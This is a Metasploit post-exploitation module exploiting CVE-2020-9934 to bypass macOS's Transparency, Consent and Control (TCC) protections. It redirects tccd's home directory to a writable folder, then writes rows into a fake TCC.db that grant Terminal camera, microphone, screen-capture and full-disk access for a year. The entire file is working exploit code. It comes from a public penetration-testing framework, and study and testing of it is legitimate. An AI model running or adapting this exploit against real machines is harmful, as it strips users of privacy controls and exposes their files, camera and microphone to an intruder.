##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post

  include Msf::Post::File
  include Msf::Post::OSX::Priv
  include Msf::Post::OSX::System

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Bypass the macOS TCC Framework',
        'Description' => %q{
          This module uses the CVE-2020-9934 to bypass the TCC framework and grant all
          permissions to the Terminal application.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'mattshockl', # discovery
          'timwr', # metasploit module
        ],
        'References' => [
          ['CVE', '2020-9934'],
          ['URL', 'https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8'],
          ['URL', 'https://github.com/mattshockl/CVE-2020-9934'],
        ],
        'Platform' => [ 'osx' ],
        'SessionTypes' => [ 'shell', 'meterpreter' ]
      )
    )
    register_options([
      OptString.new('WritableDir', [true, 'Writable directory', '/tmp'])
    ])
  end

  def check
    version = Gem::Version.new(get_system_version)
    if version >= Gem::Version.new('10.15.6')
      Exploit::CheckCode::Safe
    else
      Exploit::CheckCode::Appears
    end
  end

  def run
    if check != Exploit::CheckCode::Appears
      fail_with Failure::NotVulnerable, 'Target is not vulnerable'
    end

    if is_root?
      fail_with Failure::BadConfig, 'Session already has root privileges'
    end

    unless writable? datastore['WritableDir']
      fail_with Failure::BadConfig, "#{datastore['WritableDir']} is not writable"
    end

    tmpdir = "#{datastore['WritableDir']}/.#{Rex::Text.rand_text_alpha(8)}"
    tccdir = "#{tmpdir}/Library/Application Support/com.apple.TCC"
    tccdb = "#{tccdir}/TCC.db"

    print_status("Creating TCC directory #{tccdir}")
    cmd_exec("mkdir -p '#{tccdir}'")
    cmd_exec("launchctl setenv HOME #{tmpdir}")
    cmd_exec('launchctl stop com.apple.tccd && launchctl start com.apple.tccd')
    if file_exist?(tccdb)
      print_good("fake TCC DB found: #{tccdb}")
    else
      print_error("No fake TCC DB found: #{tccdb}")
      fail_with Failure::NotVulnerable, 'Target is not vulnerable'
    end

    tcc_services = [
      'kTCCServiceCamera', 'kTCCServiceMicrophone', 'kTCCServiceAll', 'kTCCServiceScreenCapture', 'kTCCServiceSystemPolicyDocumentsFolder', 'kTCCService',
      'kTCCServiceSystemPolicyDeveloperFiles', 'kTCCServiceSystemPolicyDesktopFolder', 'kTCCServiceSystemPolicyAllFiles', 'kTCCServiceSystemPolicyNetworkVolumes',
      'kTCCServiceSystemPolicySysAdminFiles', 'kTCCServiceSystemPolicyDownloadsFolder'
    ]
    bundle = 'com.apple.Terminal'
    csreq = 'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003'
    isfile = '0'
    timestamp = (Time.now + (60 * 60 * 24 * 365)).to_i.to_s # 1 year from now
    for service in tcc_services
      sql_insert = "INSERT INTO access VALUES('#{service}', '#{bundle}', #{isfile}, 1, 1, X'#{csreq}', NULL, NULL, 'UNUSED', NULL, NULL, #{timestamp});"
      sqloutput = cmd_exec("sqlite3 '#{tccdb}' \"#{sql_insert}\"")
      if sqloutput && !sqloutput.empty?
        print_error("Output: #{sqloutput.length}")
      end
    end
    print_good('TCC.db was successfully updated!')
    cleanup_command = 'launchctl unsetenv HOME && launchctl stop com.apple.tccd && launchctl start com.apple.tccd'
    cleanup_command << "\nrm -rf #{tmpdir}"
    print_status("To cleanup, run:\n#{cleanup_command}\n")
  end
end
